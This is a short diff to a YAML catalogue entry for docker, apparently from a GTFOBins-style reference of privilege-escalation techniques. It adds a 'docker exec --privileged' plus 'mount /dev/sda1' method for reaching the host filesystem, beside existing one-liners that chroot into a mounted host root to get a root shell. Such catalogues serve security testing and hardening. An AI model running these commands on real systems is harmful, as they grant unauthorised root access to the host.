@@ -26,6 +26,11 @@ functions:
   sudo:
     - description: The resulting is a root shell.
       code: sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+    - description: Using `docker exec` with `--privileged` flag allows to mount the host filesystem, thereby obtaining unrestricted read/write access to the host.
+      code: |
+        CONTAINER_ID=id_of_container
+        sudo docker exec -it --privileged --user root $CONTAINER_ID bash
+        mount /dev/sda1 /mnt/
   suid:
     - description: The resulting is a root shell.
       code: ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
